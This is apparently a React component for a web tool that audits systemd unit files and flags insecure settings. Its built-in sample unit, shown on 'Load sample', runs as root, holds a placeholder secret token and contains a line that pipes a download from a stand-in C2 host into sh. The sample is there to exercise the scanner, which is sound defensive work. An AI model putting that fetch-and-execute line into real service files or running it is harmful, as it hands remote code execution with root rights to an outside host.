import { useMemo, useState } from "react";
import { Textarea } from "@/components/ui/textarea";
import { Field, ErrorNote } from "@/components/tool/parts";
import { FindingsSection } from "@/components/tool/findings";
import { parseSystemdUnit } from "./logic";

const SAMPLE = `[Unit]
Description=Nightly backup

[Service]
Type=oneshot
User=root
Environment=BACKUP_TOKEN=s3cr3t-abc123
ExecStart=/home/deploy/scripts/backup.sh
ExecStartPost=curl http://c2.example/done | sh

[Install]
WantedBy=multi-user.target`;

export default function SystemdUnitTool() {
  const [input, setInput] = useState("");
  const r = useMemo(() => parseSystemdUnit(input), [input]);
  const hasInput = input.trim() !== "";

  return (
    <>
      <Field
        label="systemd unit (.service)"
        hint="Paste a systemd unit file. Writable/relative ExecStart, User= bypass, secrets in Environment= and missing hardening are flagged."
        actions={
          <button
            onClick={() => setInput(SAMPLE)}
            className="text-xs text-muted-foreground transition-colors hover:text-foreground"
          >
            Load sample
          </button>
        }
      >
        <Textarea
          autoFocus
          mono
          value={input}
          onChange={(e) => setInput(e.target.value)}
          placeholder={"[Service]\nUser=root\nExecStart=/opt/app/run.sh"}
          rows={9}
        />
      </Field>

      {hasInput && r.error ? <ErrorNote>{r.error}</ErrorNote> : null}

      {!r.error && r.directives.length > 0 ? (
        <div className="flex flex-col gap-4">
          <FindingsSection findings={r.findings} />

          <section className="flex flex-col gap-2">
            <h3 className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">
              Directives ({r.directives.length})
            </h3>
            <div className="overflow-x-auto rounded-lg border border-border">
              <table className="w-full text-left text-xs">
                <thead className="bg-muted/40 text-muted-foreground">
                  <tr>
                    <th className="px-2.5 py-1.5 font-medium">Section</th>
                    <th className="px-2.5 py-1.5 font-medium">Key</th>
                    <th className="px-2.5 py-1.5 font-medium">Value</th>
                  </tr>
                </thead>
                <tbody className="font-mono">
                  {r.directives.map((d, i) => (
                    <tr key={i} className="border-t border-border/60 align-top">
                      <td className="px-2.5 py-1.5 text-muted-foreground/70">{d.section}</td>
                      <td className="px-2.5 py-1.5 text-foreground">{d.key}</td>
                      <td className="px-2.5 py-1.5 break-all text-muted-foreground">{d.value}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </section>
        </div>
      ) : null}
    </>
  );
}
